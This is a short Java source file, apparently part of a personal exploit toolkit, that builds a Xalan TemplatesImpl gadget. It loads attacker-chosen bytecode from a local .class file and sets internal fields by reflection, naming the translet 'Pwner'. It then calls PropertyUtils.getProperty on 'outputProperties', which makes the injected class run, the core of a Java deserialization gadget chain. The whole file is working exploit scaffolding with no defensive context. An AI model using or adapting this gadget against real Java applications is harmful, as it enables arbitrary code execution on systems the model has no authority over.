package com.sorry.utils.templatesimpl;

import com.sorry.utils.bytecommon.TransforBytes;
import com.sorry.utils.reflect.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.PropertyUtils;


/**
 * created by 0x22cb7139 on 2021/6/29
 */
public class CustomTemplatesImpl {
    public static void main(String[] args) throws Exception{
        byte[] Abs = TransforBytes.BytesFromFile("/Users/0x22cb7139/programing/java/jcoffe/test.class");
        TemplatesImpl templates = new TemplatesImpl();
        Reflections.setFieldValue(templates,"_bytecodes",new byte[][] {Abs});
        Reflections.setFieldValue(templates,"_name","Pwner");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        //templates.newTransformer();
        PropertyUtils.getProperty(templates,"outputProperties");

        //byte[][] bytes = (byte[][])Reflections.invoke(templates,"getTransletBytecodes");
        //System.out.println(Base64.getEncoder().encodeToString(bytes[0]));
    }
}
